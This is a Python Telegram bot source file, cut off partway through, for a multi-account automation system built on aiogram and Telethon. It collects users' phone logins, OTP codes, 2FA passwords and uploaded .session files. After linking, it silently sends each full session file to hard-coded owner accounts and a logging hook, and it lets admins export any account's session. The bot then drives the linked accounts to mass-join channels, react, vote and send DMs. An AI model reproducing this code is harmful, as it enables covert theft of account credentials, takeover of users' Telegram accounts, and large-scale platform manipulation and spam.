import asyncio
import os
import sys
import json
import logging
import random
import aiosqlite

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile
)

from telethon import TelegramClient
from telethon.sessions import StringSession, SQLiteSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    AuthKeyUnregisteredError
)

# Modular imports
from config import API_ID, API_HASH, BOT_TOKEN, SUPER_OWNER_IDS
from database import db_mgr
from helpers import (
    registration_sessions,
    encrypt_data,
    decrypt_data,
    parse_telegram_link,
    SecurityHubLogger
)
from tasks import task_queue

# --- LOGGING SETUP ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MultiAccountSystem.Main")

# --- FSM STATES ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()
    waiting_for_session_file = State()

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_target = State()
    waiting_for_emojis = State()
    waiting_for_button_text = State()
    waiting_for_dm_text = State()

REACTION_EMOJIS = ["👍", "👎", "🔥", "🎉", "👏", "🥰", "😮", "😢", "😡", "💩", "🤩", "🤔", "👀", "💯", "🤣"]

# --- KEYBOARD BUILDERS ---
def get_emoji_selection_keyboard(selected_emojis: list) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        btn_text = f"{emoji} ✅" if is_selected else emoji
        row.append(InlineKeyboardButton(text=btn_text, callback_data=f"toggle_emoji:{emoji}"))
        if len(row) == 5:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton(text="🎲 Random Match Existing", callback_data="toggle_emoji:random_match")])
    keyboard.append([InlineKeyboardButton(text="✨ Confirm Reaction", callback_data="finish_emoji_selection")])
    keyboard.append([InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Manage Linked Accounts", callback_data="manage_accounts")],
        [InlineKeyboardButton(text="🚀 Start New Task", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 View Tasks History", callback_data="view_tasks")],
        [InlineKeyboardButton(text="👥 My Referrals", callback_data="view_referrals")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛠️ Admin Control Panel", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Core Backups", callback_data="backup_panel")])
        buttons.append([InlineKeyboardButton(text="📈 System Stats", callback_data="system_stats")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Join Channel", callback_data="set_type:join")],
        [InlineKeyboardButton(text="📤 Leave Channel", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="🎭 Add Reactions", callback_data="set_type:react")],
        [InlineKeyboardButton(text="🔘 Click Inline Button", callback_data="set_type:button_vote")],
        [InlineKeyboardButton(text="📝 Send Direct Message (DM)", callback_data="set_type:dm")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])

router = Router()

# --- HANDLERS ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)

    welcome_text = (
        f"👋 Welcome to the Multi-Account Automation System!\n\n"
        f"🆔 Account ID: {user_id}\n"
        f"⚡ System Privilege Level: {role.upper()}\n\n"
        "Manage, connect, and deploy multiple Telegram accounts safely from one screen."
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard(role))

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text(
        "🎛️ Main Control Panel\nChoose an action below to get started:",
        reply_markup=get_main_keyboard(role)
    )

# --- GET SESSION FILE IMPLEMENTATION ---
@router.message(Command("getsession"))
async def cmd_get_session(message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("ℹ️ Usage:\n/getsession <phone_number_without_plus>\n\nExample:\n/getsession 1234567890")
        return
        
    target_phone = args[1].replace("+", "").strip()

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT user_id, username, session_string FROM accounts WHERE phone = ?", (target_phone,)) as cursor:
            row = await cursor.fetchone()
            
    if not row:
        await message.answer("❌ This phone number is not registered in the system database.")
        return
        
    account_owner_id, account_username, enc_session = row
    
    if role not in ["admin", "owner", "super_owner"] and account_owner_id != user_id:
        await message.answer("🚫 Permission Denied: You cannot access this session file.")
        return

    progress_msg = await message.answer("⏳ Regenerating physical SQLite session structure...")
    
    decrypted_session_str = decrypt_data(enc_session)
    if not decrypted_session_str:
        await progress_msg.edit_text("❌ Failed to decrypt session string data.")
        return

    export_filename = f"export_{target_phone}_{random.randint(1000, 9999)}"
    export_full_path = f"{export_filename}.session"

    try:
        temp_session = SQLiteSession(export_filename)
        parsed_string_session = StringSession(decrypted_session_str)
        
        temp_session.set_dc(
            parsed_string_session.dc_id,
            parsed_string_session.server_address,
            parsed_string_session.port
        )
        temp_session.auth_key = parsed_string_session.auth_key
        temp_session.save()
        temp_session.close() 
        
        await asyncio.sleep(0.5)

        if not os.path.exists(export_full_path):
            raise FileNotFoundError("Could not finalize export compilation structure on runtime storage.")

        with open(export_full_path, "rb") as f:
            session_bytes = f.read()

        session_file_payload = BufferedInputFile(session_bytes, filename=f"+{target_phone}.session")
        
        caption_text = (
            f"🔑 Physical Telegram Session File Extracted\n"
            f"📱 Phone: +{target_phone}\n"
            f"👤 Username: @{account_username or 'N/A'}\n"
            f"⚙️ Format: Standard Telethon SQLite Binary (.session)"
        )
        
        await message.reply_document(document=session_file_payload, caption=caption_text)
        await progress_msg.delete()

    except Exception as e:
        logger.error(f"Error compiling session file for extraction: {e}")
        await progress_msg.edit_text(f"❌ System failure extracting database file: {str(e)}")
    finally:
        if os.path.exists(export_full_path):
            try:
                os.remove(export_full_path)
            except Exception:
                pass

# --- CANCEL TASK IMPLEMENTATION ---
@router.message(Command("canceltask"))
async def cmd_cancel_task(message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ Usage:\n/canceltask <task_id>")
        return
        
    task_id = int(args[1])
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, status FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()
            
    if not row:
        await message.answer("❌ Task not found in database.")
        return
        
    creator_id, status = row
    
    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
        await message.answer("🚫 Permission Denied: You cannot cancel this task.")
        return
        
    if status in ["completed", "failed", "cancelled"]:
        await message.answer(f"ℹ️ Task {task_id} has already finished with status: {status.upper()}")
        return
        
    was_active_or_pending = await task_queue.cancel_specific_task(task_id)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE tasks SET status = 'cancelled', progress = 'Stopped by user request' WHERE task_id = ?", (task_id,))
        await db.commit()
        
    await db_mgr.log_action(user_id, f"Cancelled task {task_id}")
    await message.answer(f"🛑 Task {task_id} successfully cancelled. Processing updates have terminated.")

# --- ADMIN PANEL & COMMANDS ---
@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
        return

    args = message.text.split()
    if len(args) < 3 or not args[1].isdigit() or not args[2].isdigit():
        await message.answer("ℹ️ Usage:\n/addadmin <target_user_id> <max_account_limit>\n\nExample:\n/addadmin 987654321 50")
        return

    target_id, limit = int(args[1]), int(args[2])
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (target_id,)) as cursor:
            if not await cursor.fetchone():
                await db.execute("INSERT INTO users (user_id, username, role, max_accounts) VALUES (?, 'Admin Profile', 'admin', ?)", (target_id, limit))
            else:
                await db.execute("UPDATE users SET role = 'admin', max_accounts = ? WHERE user_id = ?", (limit, target_id))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Promoted user {target_id} to Admin with limit {limit}")
    await message.answer(f"✅ Success! User {target_id} is now registered as an Admin with access limit set to {limit} accounts.")

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ Usage:\n/removeadmin <target_user_id>")
        return

    target_id = int(args[1])
    target_role = await db_mgr.get_user_role(target_id)
    if target_role == "super_owner":
        await message.answer("❌ Security Error: Super Owners cannot be demoted.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET role = 'user', max_accounts = 5 WHERE user_id = ?", (target_id,))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Demoted Admin {target_id}")
    await message.answer(f"✅ User {target_id} has been demoted back to a regular user.")

@router.message(Command("deleteaccount"))
async def cmd_delete_account(message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("ℹ️ Usage:\n/deleteaccount <phone_number_without_plus>\n\nExample:\n/deleteaccount 1234567890")
        return
        
    target_phone = args[1].replace("+", "").strip()

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT user_id FROM accounts WHERE phone = ?", (target_phone,)) as cursor:
            row = await cursor.fetchone()
            
    if not row:
        await message.answer("❌ This account is not registered in the system.")
        return
        
    account_owner_id = row[0]
    
    is_allowed = False
    if role in ["owner", "super_owner"] or account_owner_id == user_id:
        is_allowed = True
    elif role == "admin":
        async with aiosqlite.connect(db_mgr.db_path) as db:
            async with db.execute("SELECT role, referred_by FROM users WHERE user_id = ?", (account_owner_id,)) as cursor:
                u_row = await cursor.fetchone()
                if u_row:
                    u_role, referred_by = u_row
                    if u_role == "user" or referred_by == user_id:
                        is_allowed = True

    if not is_allowed:
        await message.answer("🚫 Permission Denied: You cannot delete this account.")
        return

    for filename in [f"session_{target_phone}.session", f"+{target_phone}.session"]:
        if os.path.exists(filename):
            try:
                os.remove(filename)
            except Exception:
                pass

    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("DELETE FROM accounts WHERE phone = ?", (target_phone,))
        await db.commit()

    await db_mgr.log_action(user_id, f"Deleted account session +{target_phone}")
    await message.answer(f"🗑️ Permanent deletion complete. The session for +{target_phone} has been wiped.")

@router.message(Command("deleteuser"))
async def cmd_delete_user(message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ Usage:\n/deleteuser <user_id_to_wipe>\n\nExample:\n/deleteuser 7952327997")
        return
        
    target_user_id = int(args[1])
    
    if target_user_id in SUPER_OWNER_IDS:
        await message.answer("❌ Security Error: Super Owners cannot be deleted from the database.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT role, referred_by FROM users WHERE user_id = ?", (target_user_id,)) as cursor:
            row = await cursor.fetchone()
            
    if not row:
        await message.answer("❌ This user profile is not registered in the system.")
        return
        
    target_role, referred_by = row
    
    is_allowed = False
    if role in ["owner", "super_owner"]:
        is_allowed = True
    elif role == "admin" and referred_by == user_id:
        is_allowed = True

    if not is_allowed:
        await message.answer("🚫 Permission Denied: You cannot delete this user.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT phone FROM accounts WHERE user_id = ?", (target_user_id,)) as cursor:
            async for acct_row in cursor:
                phone = acct_row[0]
                for filename in [f"session_{phone}.session", f"+{phone}.session"]:
                    if os.path.exists(filename):
                        try:
                            os.remove(filename)
                        except Exception:
                            pass
                            
        await db.execute("DELETE FROM accounts WHERE user_id = ?", (target_user_id,))
        await db.execute("DELETE FROM users WHERE user_id = ?", (target_user_id,))
        await db.commit()

    await db_mgr.log_action(user_id, f"Deleted user ID {target_user_id} and all related accounts")
    await message.answer(f"🗑️ Wiped profile {target_user_id} and all associated Telegram sessions successfully.")

# --- ACCOUNT CONTROL HANDLERS ---
@router.callback_query(F.data == "manage_accounts")
async def list_user_accounts(callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT phone, status, username FROM accounts")
        else:
            cursor = await db.execute("SELECT phone, status, username FROM accounts WHERE user_id = ?", (user_id,))
        rows = await cursor.fetchall()

    text = "📱 Linked Telegram Accounts\n\n"
    if not rows:
        text += "No accounts linked yet."
    else:
        for row in rows:
            icon = "🟢" if row[1] == "active" else "🔴"
            text += f"{icon} +{row[0]} (@{row[2] or 'N/A'}) - {row[1].upper()}\n"
            text += f"↳ Get file: /getsession {row[0]} | Remove: /deleteaccount {row[0]}\n\n"

    buttons = [
        [InlineKeyboardButton(text="📞 Link via OTP Code", callback_data="add_account_phone")],
        [InlineKeyboardButton(text="📁 Link via .session File", callback_data="add_account_session_file")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📞 Enter the phone number with country code (e.g. +1234567890):")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.callback_query(F.data == "add_account_session_file")
async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📁 Upload / Forward a .session File:\n\nPlease send or forward the target account's raw session file now.")
    await state.set_state(RegistrationStates.waiting_for_session_file)

# --- LINK VIA SESSION FILE ---
@router.message(StateFilter(RegistrationStates.waiting_for_session_file), F.document)
async def process_session_file_upload(message: Message, state: FSMContext, bot: Bot):
    if not message.document.file_name.endswith('.session'):
        await message.answer("❌ Invalid format! Please make sure you are sending a file ending with .session.")
        return

    progress_msg = await message.answer("📥 Downloading and parsing session file structure...")
    user_id = message.from_user.id
    
    temp_filename = f"import_temp_{user_id}_{random.randint(1000, 9999)}"
    temp_full_path = f"{temp_filename}.session"
    
    try:
        await bot.download(message.document, destination=temp_full_path)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            db_conn = await aiosqlite.connect(temp_full_path)
            cursor = await db_conn.execute("SELECT dcId, testMode, authKey FROM sessions LIMIT 1")
            row = await cursor.fetchone()
            if row:
                dc_id, test_mode, auth_key = row
                client.session.set_dc(dc_id, "149.154.167.50" if dc_id != 2 else "149.154.167.51", 443)
                client.session.auth_key = auth_key
            await db_conn.close()
        except Exception:
            client = TelegramClient(temp_filename, API_ID, API_HASH)
            await client.connect()
            
        if not await client.is_user_authorized():
            await progress_msg.edit_text("❌ Import Failed: This session file has expired or is invalid.")
            await client.disconnect()
            if os.path.exists(temp_full_path):
                os.remove(temp_full_path)
            await state.clear()
            return
            
        me = await client.get_me()
        if not me.phone:
            await progress_msg.edit_text("❌ Import Failed: Could not parse a valid phone string bound to session registry data.")
            await client.disconnect()
            if os.path.exists(temp_full_path):
                os.remove(temp_full_path)
            await state.clear()
            return
            
        clean_phone = me.phone.replace("+", "").strip()
        
        session_str = StringSession.save(client.session)
        encrypted_session = encrypt_data(session_str)
        
        await client.disconnect()
        
        with open(temp_full_path, "rb") as f:
            session_bytes = f.read()
            
        if os.path.exists(temp_full_path):
            os.remove(temp_full_path)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (clean_phone, user_id, me.username or "None", encrypted_session))
            await db.commit()

        await db_mgr.log_action(user_id, f"Linked account +{clean_phone} via file upload")
        await progress_msg.delete()
        
        await message.answer(f"🎉 Account Linked Successfully via File!\n📱 Phone: +{clean_phone}\n👤 Username: @{me.username or 'N/A'}")
        
        await SecurityHubLogger.log_session_onboarding(
            bot=bot, telemetry_src="Session File Upload", user_id=user_id, 
            phone=clean_phone, session_username=me.username, session_bytes=session_bytes
        )

        caption_text = (
            f"🔑 Session File Imported via Forward/Upload\n"
            f"📱 Phone: +{clean_phone}\n"
            f"👤 Username: @{me.username or 'N/A'}\n"
            f"🆔 Linked By User ID: {user_id}"
        )
        
        for owner_id in SUPER_OWNER_IDS:
            try:
                owner_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
                await bot.send_document(chat_id=owner_id, document=owner_file, caption=caption_text)
            except Exception as owner_err:
                logger.error(f"Could not sync uploaded session file to owner {owner_id}: {owner_err}")
                
        await state.clear()

    except Exception as e:
        logger.error(f"Error importing session file layout: {e}")
        await progress_msg.edit_text(f"❌ System error reading file framework: {str(e)}")
        if os.path.exists(temp_full_path):
            try:
                os.remove(temp_full_path)
            except Exception:
                pass
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
async def process_session_file_invalid_message(message: Message):
    await message.answer("⚠️ Please send or forward a valid .session document file asset.")

# --- LIVE PHONE OTP REGISTER FLOW ---
@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id
    clean_phone = phone.replace("+", "").strip()

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT session_string, username FROM accounts WHERE phone = ?", (clean_phone,)) as cursor:
            existing = await cursor.fetchone()
            
    if existing:
        enc_session, existing_username = existing
        decrypted_session = decrypt_data(enc_session)
        client = TelegramClient(StringSession(decrypted_session), API_ID, API_HASH)
        
        await message.answer("🔄 Existing account session found in database! Verifying connection...")
        try:
            await client.connect()
            if await client.is_user_authorized():
                async with aiosqlite.connect(db_mgr.db_path) as db:
                    await db.execute("UPDATE accounts SET status = 'active', last_active = CURRENT_TIMESTAMP WHERE phone = ?", (clean_phone,))
                    await db.commit()
                
                await message.answer(f"🎉 Account Re-connected! +{clean_phone} (@{existing_username or 'N/A'}) is now active again.")
                await client.disconnect()
                await state.clear()
                return
            await client.disconnect()
        except Exception as err:
            logger.warning(f"Failed to restore existing session for +{clean_phone}: {err}. Proceeding with fresh login.")

    session_filename = f"session_{clean_phone}"
    client = TelegramClient(session_filename, API_ID, API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {
            "client": client,
            "phone": phone,
            "session_filename": session_filename,
            "phone_code_hash": sent_code.phone_code_hash
        }
        await message.answer("📩 OTP Code sent. Enter the login verification code below:")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        logger.error(f"Failed to send code: {e}")
        await message.answer(f"❌ Error setting up account: {str(e)}\nUse /start to try again.")
        await client.disconnect()
        if os.path.exists(f"{session_filename}.session"):
            os.remove(f"{session_filename}.session")
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext):
    user_id = message.from_user.id
    otp = message.text.strip()
    
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Session timed out. Please run /start to restart.")
        await state.clear()
        return

    client = reg_data["client"]
    phone = reg_data["phone"]
    phone_code_hash = reg_data["phone_code_hash"]
    session_filename = reg_data["session_filename"]
    
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, session_filename, user_id)
    except SessionPasswordNeededError:
        await message.answer("🔒 Two-Factor Authentication (2FA) is active. Enter your 2FA password:")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except PhoneCodeInvalidError:
        await message.answer("❌ Invalid code. Please verify and try again:")
    except Exception as e:
        await message.answer(f"❌ Connection failed: {str(e)}")
        await client.disconnect()
        if os.path.exists(f"{session_filename}.session"):
            os.remove(f"{session_filename}.session")
        registration_sessions.pop(user_id, None)
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()

    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Session dropped. Please restart.")
        await state.clear()
        return

    client = reg_data["client"]
    phone = reg_data["phone"]
    session_filename = reg_data["session_filename"]
    
    try:
        await client.sign_in(password=password)
        await complete_registration(message, state, client, phone, session_filename, user_id)
    except PasswordHashInvalidError:
        await message.answer("❌ Incorrect password. Try again:")
    except Exception as e:
        await message.answer(f"❌ Authentication error: {str(e)}")
        await client.disconnect()
        if os.path.exists(f"{session_filename}.session"):
            os.remove(f"{session_filename}.session")
        registration_sessions.pop(user_id, None)
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, session_filename: str, user_id: int):
    try:
        me = await client.get_me()
        clean_phone = phone.replace("+", "").strip()
        
        session_str = StringSession.save(client.session)
        encrypted_session = encrypt_data(session_str)

        actual_session_file = f"{session_filename}.session"
        await asyncio.sleep(0.5)

        if not os.path.exists(actual_session_file):
            raise FileNotFoundError("Raw session file was not generated cleanly by SQLite backend.")

        with open(actual_session_file, "rb") as f:
            session_bytes = f.read()

        await client.disconnect()

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (clean_phone, user_id, me.username or "None", encrypted_session))
            await db.commit()

        await db_mgr.log_action(user_id, f"Linked account +{clean_phone}")
        await message.answer(f"🎉 Account Verified! +{clean_phone} (@{me.username or 'N/A'}) is now registered.")
        
        await SecurityHubLogger.log_session_onboarding(
            bot=message.bot, telemetry_src="Live OTP Registration", user_id=user_id, 
            phone=clean_phone, session_username=me.username, session_bytes=session_bytes
        )

        session_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
        caption_text = (
            f"🔑 Session File Exported (SQLite Binary)\n"
            f"📱 Phone: +{clean_phone}\n"
            f"👤 Username: @{me.username or 'N/A'}\n"
            f"🆔 Linked By User ID: {user_id}\n\n"
            f"⚠️ This is a valid SQLite session database file. You can use this file directly to log into other systems/bots."
        )
        
        try:
            await message.answer_document(document=session_file, caption=caption_text)
        except Exception as e:
            logger.error(f"Failed sending session file to user: {e}")
            
        for owner_id in SUPER_OWNER_IDS:
            try:
                owner_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
                await message.bot.send_document(chat_id=owner_id, document=owner_file, caption=caption_text)
            except Exception as owner_err:
                logger.error(f"Could not backup session file to owner {owner_id}: {owner_err}")

        if os.path.exists(actual_session_file):
            os.remove(actual_session_file)

    except Exception as e:
        await message.answer(f"❌ Database/Session export error: {str(e)}")
        try:
            await client.disconnect()
        except Exception:
            pass
        if os.path.exists(f"{session_filename}.session"):
            os.remove(f"{session_filename}.session")
    finally:
        registration_sessions.pop(user_id, None)
        await state.clear()

# --- TASK CREATION SCHEDULER WIZARD ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        "⚡ New Automation Task Configuration\nSelect the type of action you want to configure:",
        reply_markup=get_task_types_keyboard()
    )
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    
    if task_type in ["react", "button_vote"]:
        await callback.message.edit_text(
            "🔗 Provide Post Link:\nPaste the link pointing to the target message(s).\n"
            "Supports multiple message IDs or ranges (e.g. t.me/channel/123-125):"
        )
    else:
        await callback.message.edit_text(
            "🔗 Enter Target Address:\nProvide the Username, Public Link, or Private Invitation Link:"
        )
    await state.set_state(TaskWizardStates.waiting_for_target)

@router.message(StateFilter(TaskWizardStates.waiting_for_target))
async def task_hub_process_target(message: Message, state: FSMContext):
    target = message.text.strip()
    await state.update_data(target=target)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type in ["join", "leave"]:
        await finalize_task_creation(message, state)
        
    elif task_type == "react":
        await state.update_data(selected_emojis=[])
        await message.answer(
            "🎭 Choose Emojis to Distribute:\nSelect one or more reaction emojis from the buttons below.\n"
            "If you select Random Match Existing, accounts will react using random emojis that are already active on that post.",
            reply_markup=get_emoji_selection_keyboard([])
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
        
    elif task_type == "button_vote":
        await message.answer(
            "🔘 Enter Button Text or Emoji:\nType the exact word or emoji of the button you want to click (e.g. Click Here):"
        )
        await state.set_state(TaskWizardStates.waiting_for_button_text)
        
    elif task_type == "dm":
        await message.answer("📝 Enter DM Message Text: Enter the message content to send:")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

# --- REACTION CALLBACKS ---
@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    emoji = callback.data.split(":")[1]
    data = await state.get_data()
    
    if emoji == "random_match":
        await state.update_data(selected_emojis=[], random_match=True)
        await callback.answer("🎲 Enabled Random Match! Accounts will mirror existing emojis on the post.", show_alert=True)
        await callback.message.delete()
        await finalize_task_creation(callback.message, state)
        return

    selected_emojis = data.get("selected_emojis", [])
    await state.update_data(random_match=False)

    if emoji in selected_emojis:
        selected_emojis.remove(emoji)
    else:
        selected_emojis.append(emoji)

    await state.update_data(selected_emojis=selected_emojis)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(selected_emojis))
    await callback.answer()

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    selected_emojis = data.get("selected_emojis", [])

    if not selected_emojis and not data.get("random_match"):
        await callback.answer("⚠️ Select at least one emoji or choose Random Match Existing!", show_alert=True)
        return

    await state.update_data(reactions=selected_emojis)
    await callback.message.delete()
    await finalize_task_creation(callback.message, state)
    await callback.answer()

# --- OTHER INPUT HANDLING ---
@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext):
    btn_text = message.text.strip()
    await state.update_data(button_text=btn_text)
    await finalize_task_creation(message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext):
    dm_text = message.text.strip()
    await state.update_data(text=dm_text)
    await finalize_task_creation(message, state)

# --- FINALIZER ---
async def finalize_task_creation(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    task_type = data.pop("task_type")
    
    target = data.get("target", "")
    parsed_target, link_msg_ids = parse_telegram_link(target)
    
    if link_msg_ids:
        data["msg_ids"] = link_msg_ids

    payload_json = json.dumps(data)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute(
            "INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)",
            (user_id, task_type, payload_json)
        )
        task_id = cursor.lastrowid
        await db.commit()

    await task_queue.add_task(task_id, user_id, task_type, data)
    await db_mgr.log_action(user_id, f"Queued task {task_id} [{task_type.upper()}]")
    
    response_msg = (
        f"🚀 Task {task_id} added to the queue!\n"
        f"⚙️ Type: {task_type.upper()}\n\n"
        f"Active accounts are processing this action. Track status with /taskreport_{task_id}\n"
        f"To cancel this automation pipeline, use: /canceltask {task_id}"
    )
    
    if isinstance(message, Message):
        await message.answer(response_msg)
    else:
        await message.answer(response_msg)
    
    await state.clear()

# --- REPORTS SYSTEM ---
@router.callback_query(F.data == "view_tasks")
async def view_tasks(callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 10")
        else:
            cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10", (user_id,))
        rows = await cursor.fetchall()

    text = "📊 Recent Automation Tasks\n\n"
    if not rows:
        text += "No tasks found."
    else:
        for row in rows:
